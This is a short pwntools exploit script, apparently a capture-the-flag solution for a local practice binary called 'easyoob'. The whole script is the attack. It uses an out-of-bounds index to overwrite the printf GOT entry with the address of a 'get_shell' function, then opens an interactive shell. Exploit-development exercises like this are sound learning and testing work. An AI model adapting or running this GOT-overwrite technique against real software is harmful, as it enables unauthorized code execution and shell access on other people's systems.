from pwn import *

get_shell = 0x40069a

e = ELF('easyoob')
p = process('easyoob')

p.sendline('-1')
p.sendline(str(e.got['printf']))
p.sendline(p64(get_shell))

p.interactive()